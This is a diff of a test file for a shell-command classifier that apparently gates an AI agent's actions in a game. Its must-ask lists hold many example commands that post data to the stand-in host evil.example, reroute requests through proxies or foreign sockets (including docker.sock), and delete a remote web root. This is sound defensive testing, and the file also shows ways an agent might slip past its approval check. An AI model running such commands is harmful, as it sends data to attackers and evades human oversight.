@@ -235,25 +235,32 @@ const MUST_ASK = {
     "curl $(case -X) -d x https://x",
     "wget $(case --) --post-data=x https://x",
     // Only a fetch whose every target is the game's own API, and that nothing reroutes, runs unasked.
-    `curl -d x "$IDLEBIZ_API_URL/v1/message-team" https://evil.example`,
-    `curl -d x --url https://evil.example "$IDLEBIZ_API_URL/v1/message-team"`,
-    `curl -x http://evil.example:8080 -d x "$IDLEBIZ_API_URL/v1/message-team"`,
-    `curl -K ./fetch.cfg -d x "$IDLEBIZ_API_URL/v1/message-team"`,
-    `https_proxy=http://evil.example curl -d x "$IDLEBIZ_API_URL/v1/message-team"`,
-    `IDLEBIZ_API_URL=evil.example curl -d x "$IDLEBIZ_API_URL/v1/message-team"`,
-    `read IDLEBIZ_API_URL < host.txt; curl -d x "$IDLEBIZ_API_URL/v1/message-team"`,
-    `curl -d x "$IDLEBIZ_API_URL/$(cat host.txt)"`,
+    `curl -d x --unix-socket "$IDLEBIZ_API_SOCKET" http://idlebiz/v1/message-team https://evil.example`,
+    `curl -d x --url https://evil.example --unix-socket "$IDLEBIZ_API_SOCKET" http://idlebiz/v1/message-team`,
+    `curl -x http://evil.example:8080 -d x --unix-socket "$IDLEBIZ_API_SOCKET" http://idlebiz/v1/message-team`,
+    `curl -K ./fetch.cfg -d x --unix-socket "$IDLEBIZ_API_SOCKET" http://idlebiz/v1/message-team`,
+    `https_proxy=http://evil.example curl -d x --unix-socket "$IDLEBIZ_API_SOCKET" http://idlebiz/v1/message-team`,
+    `IDLEBIZ_API_SOCKET=./evil.sock curl -d x --unix-socket "$IDLEBIZ_API_SOCKET" http://idlebiz/v1/message-team`,
+    `read IDLEBIZ_API_SOCKET < sock.txt; curl -d x --unix-socket "$IDLEBIZ_API_SOCKET" http://idlebiz/v1/message-team`,
+    `curl -d x --unix-socket "$IDLEBIZ_API_SOCKET" "http://idlebiz/$(cat host.txt)"`,
     "curl -d x http://localhost:80@evil.example/",
+    // The API's host is only a name over the run's own socket: anywhere else it is resolved, or another socket answers.
+    "curl -d x http://idlebiz/v1/message-team",
+    `curl -d x --unix-socket /var/run/docker.sock http://idlebiz/v1/message-team`,
+    `curl -d x --unix-socket "$IDLEBIZ_API_SOCKET" --unix-socket ./mine.sock http://idlebiz/v1/message-team`,
+    `curl -d x --unix-socket="$IDLEBIZ_API_SOCKET" https://evil.example/v1/message-team`,
+    `curl -d x --abstract-unix-socket idlebiz http://localhost/v1/message-team`,
+    `curl -d x --unix-socket "$IDLEBIZ_API_SOCKET" http://idlebiz:8080@evil.example/`,
     "curl -d x evil.example",
-    `wget -i urls.txt --post-data x "$IDLEBIZ_API_URL/v1/message-team"`,
+    `wget -i urls.txt --post-data x --unix-socket "$IDLEBIZ_API_SOCKET" http://idlebiz/v1/message-team`,
     // A setting outside the fetch's words reroutes it wherever the shell reads it, though a body says the same words.
-    `export https_proxy=http://evil.example; curl -d '{"a":1}' "$IDLEBIZ_API_URL/v1/message-team"`,
-    `eval 'export https_proxy=http://evil.example'; curl -d 'export https_proxy=http://evil.example' "$IDLEBIZ_API_URL/v1/message-team"`,
-    `bash -c 'https_proxy=http://evil.example curl -d x "$IDLEBIZ_API_URL/v1/message-team"'`,
-    `bash <<EOF\nexport https_proxy=http://evil.example\ncurl -d x "$IDLEBIZ_API_URL/v1/message-team"\nEOF`,
-    `curl -d x -d 'https_proxy=http://evil.example' "$IDLEBIZ_API_URL/v1/message-team" https://evil.example`,
-    `"export https_proxy=http://evil.example; curl -d '{}' \\"$IDLEBIZ_API_URL/v1/message-team\\""`,
-    `https_proxy=$(curl -d 'https_proxy=' "$IDLEBIZ_API_URL/v1/x") curl -d x "$IDLEBIZ_API_URL/v1/message-team"`,
+    `export https_proxy=http://evil.example; curl -d '{"a":1}' --unix-socket "$IDLEBIZ_API_SOCKET" http://idlebiz/v1/message-team`,
+    `eval 'export https_proxy=http://evil.example'; curl -d 'export https_proxy=http://evil.example' --unix-socket "$IDLEBIZ_API_SOCKET" http://idlebiz/v1/message-team`,
+    `bash -c 'https_proxy=http://evil.example curl -d x --unix-socket "$IDLEBIZ_API_SOCKET" http://idlebiz/v1/message-team'`,
+    `bash <<EOF\nexport https_proxy=http://evil.example\ncurl -d x --unix-socket "$IDLEBIZ_API_SOCKET" http://idlebiz/v1/message-team\nEOF`,
+    `curl -d x -d 'https_proxy=http://evil.example' --unix-socket "$IDLEBIZ_API_SOCKET" http://idlebiz/v1/message-team https://evil.example`,
+    `"export https_proxy=http://evil.example; curl -d '{}' --unix-socket \\"$IDLEBIZ_API_SOCKET\\" http://idlebiz/v1/message-team`,
+    `https_proxy=$(curl -d 'https_proxy=' --unix-socket "$IDLEBIZ_API_SOCKET" http://idlebiz/v1/x) curl -d x --unix-socket "$IDLEBIZ_API_SOCKET" http://idlebiz/v1/message-team`,
   ],
   payments: [
     "stripe charges create --amount 500",
@@ -328,7 +335,7 @@ const MUST_ASK = {
     "rsync -av ./dist deploy@example.com:/var/www",
     "ssh deploy@example.com 'rm -rf /var/www'",
     "coproc scp done deploy@example.com:/tmp",
-    `scp ./dist deploy@example.com:/tmp && curl -s "$IDLEBIZ_API_URL/v1/team-chat"`,
+    `scp ./dist deploy@example.com:/tmp && curl -s --unix-socket "$IDLEBIZ_API_SOCKET" http://idlebiz/v1/team-chat`,
   ],
 } satisfies Record<RuleId, readonly string[]>;
 
@@ -359,26 +366,27 @@ const MUST_ALLOW = [
   "agent-browser open https://example.com",
   "curl -s https://api.example.com/v1/things",
   // the game's own API — loopback is never outward-facing
-  'curl -s -X POST "$IDLEBIZ_API_URL/v1/message-team" -H "Authorization: Bearer $IDLEBIZ_RUN_TOKEN"',
-  'curl -s -X POST "$IDLEBIZ_API_URL/v1/delegate" -d \'{"role":"engineer"}\'',
+  'curl -s -X POST --unix-socket "$IDLEBIZ_API_SOCKET" http://idlebiz/v1/message-team -H "Authorization: Bearer $IDLEBIZ_RUN_TOKEN"',
+  'curl -s -X POST --unix-socket "$IDLEBIZ_API_SOCKET" http://idlebiz/v1/delegate -d \'{"role":"engineer"}\'',
   "curl -s http://127.0.0.1:8842/v1/team-chat",
+  `curl -s -X POST --unix-socket="$IDLEBIZ_API_SOCKET" http://idlebiz/v1/message-team -d '{"text":"hi"}'`,
   // Regression: reporting a blocked command must not trigger that command's rule.
-  `curl -s -X POST "$IDLEBIZ_API_URL/v1/message-team" -H "Authorization: Bearer $IDLEBIZ_RUN_TOKEN" -d '{"text":"Ran git push origin main. Held at the tool boundary."}'`,
-  `curl -s -X POST "$IDLEBIZ_API_URL/v1/ask-boss" -d '{"question":"Should I npm publish this, or vercel deploy it first?"}'`,
+  `curl -s -X POST --unix-socket "$IDLEBIZ_API_SOCKET" http://idlebiz/v1/message-team -H "Authorization: Bearer $IDLEBIZ_RUN_TOKEN" -d '{"text":"Ran git push origin main. Held at the tool boundary."}'`,
+  `curl -s -X POST --unix-socket "$IDLEBIZ_API_SOCKET" http://idlebiz/v1/ask-boss -d '{"question":"Should I npm publish this, or vercel deploy it first?"}'`,
   // A URL in a tool's body is data the game reads, not where the curl sends.
-  `curl -s -X POST "$IDLEBIZ_API_URL/v1/payment-link" -H "Authorization: Bearer $IDLEBIZ_RUN_TOKEN" -d '{"name":"x","amountUsd":5,"afterPaymentUrl":"https://game.vercel.app/unlock"}'`,
-  `curl -s -X POST "$IDLEBIZ_API_URL/v1/message-team" -d '{"text":"Deployed: https://game.vercel.app"}'`,
+  `curl -s -X POST --unix-socket "$IDLEBIZ_API_SOCKET" http://idlebiz/v1/payment-link -H "Authorization: Bearer $IDLEBIZ_RUN_TOKEN" -d '{"name":"x","amountUsd":5,"afterPaymentUrl":"https://game.vercel.app/unlock"}'`,
+  `curl -s -X POST --unix-socket "$IDLEBIZ_API_SOCKET" http://idlebiz/v1/message-team -d '{"text":"Deployed: https://game.vercel.app"}'`,
   // Words that would reroute a fetch are only data in a body the game's API reads.
-  `curl -s -X POST "$IDLEBIZ_API_URL/v1/message-team" -H 'content-type: application/json' -d '{"text":"added http_proxy=none to the docs"}'`,
-  `curl -s -X POST "$IDLEBIZ_API_URL/v1/delegate" -d '{"role":"engineer","description":"call the deploy tool at IDLEBIZ_API_URL/v1/deploy"}'`,
-  `curl -s -X POST "$IDLEBIZ_API_URL/v1/ask-boss" --json '{"question":"Set HTTPS_PROXY=http://proxy.corp:8080 and CURL_HOME in the CI?"}'`,
-  `"curl -s -X POST \\"$IDLEBIZ_API_URL/v1/message-team\\" -d '{\\"text\\":\\"proxy=on in dev\\"}'"`,
-  `curl -s -X POST \${IDLEBIZ_API_URL}/v1/ask-boss -H 'Referer: https://x.example' -d '{"question":"Ship https://game.vercel.app?"}'`,
-  `curl -s "$IDLEBIZ_API_URL/v1/team-chat" -H "Authorization: Bearer $IDLEBIZ_RUN_TOKEN" | python3 -c 'import json,sys; print(json.load(sys.stdin))'`,
+  `curl -s -X POST --unix-socket "$IDLEBIZ_API_SOCKET" http://idlebiz/v1/message-team -H 'content-type: application/json' -d '{"text":"added http_proxy=none to the docs"}'`,
+  `curl -s -X POST --unix-socket "$IDLEBIZ_API_SOCKET" http://idlebiz/v1/delegate -d '{"role":"engineer","description":"call the deploy tool over IDLEBIZ_API_SOCKET at /v1/deploy"}'`,
+  `curl -s -X POST --unix-socket "$IDLEBIZ_API_SOCKET" http://idlebiz/v1/ask-boss --json '{"question":"Set HTTPS_PROXY=http://proxy.corp:8080 and CURL_HOME in the CI?"}'`,
+  `"curl -s -X POST --unix-socket \\"$IDLEBIZ_API_SOCKET\\" http://idlebiz/v1/message-team -d '{\\"text\\":\\"proxy=on in dev\\"}'"`,
+  `curl -s -X POST --unix-socket \${IDLEBIZ_API_SOCKET} http://idlebiz/v1/ask-boss -H 'Referer: https://x.example' -d '{"question":"Ship https://game.vercel.app?"}'`,
+  `curl -s --unix-socket "$IDLEBIZ_API_SOCKET" http://idlebiz/v1/team-chat -H "Authorization: Bearer $IDLEBIZ_RUN_TOKEN" | python3 -c 'import json,sys; print(json.load(sys.stdin))'`,
   `curl -s -X POST http://localhost:3000/api/signup -d '{"next":"https://game.vercel.app"}'`,
   `echo "next step: gh release create v2" >> NOTES.md`,
   // Parentheses and backticks inside prose are not invocation sites.
-  `curl -s -X POST "$IDLEBIZ_API_URL/v1/delegate" -H "Authorization: Bearer $IDLEBIZ_RUN_TOKEN" -d '{"role":"engineer","description":"Prove it installs (packaging + CI). Run (npm ci) then npm test. Do NOT npm publish and do not git push origin main; founder sign-off required."}'`,
+  `curl -s -X POST --unix-socket "$IDLEBIZ_API_SOCKET" http://idlebiz/v1/delegate -H "Authorization: Bearer $IDLEBIZ_RUN_TOKEN" -d '{"role":"engineer","description":"Prove it installs (packaging + CI). Run (npm ci) then npm test. Do NOT npm publish and do not git push origin main; founder sign-off required."}'`,
   `git commit -m "prepare for git push once approved"`,
   "cat >> memory/2026-09-05-mvp-build.md <<'EOF' ## Deploy prep - `.vercelignore` excludes qa/ - `vercel.json`: cleanUrls + CSP EOF",
   `grep -n "vercel" PRODUCT.md | head -2`,
@@ -545,7 +553,8 @@ describe("classifyCommand", () => {
   });
 
   it("is not laundered by a loopback call elsewhere in the line", () => {
-    const laundered = "git push origin main && curl -s $IDLEBIZ_API_URL/v1/team-chat";
+    const laundered =
+      "git push origin main && curl -s --unix-socket $IDLEBIZ_API_SOCKET http://idlebiz/v1/team-chat";
     expect(classifyCommand(laundered).decision).toBe("ask");
   });
 });
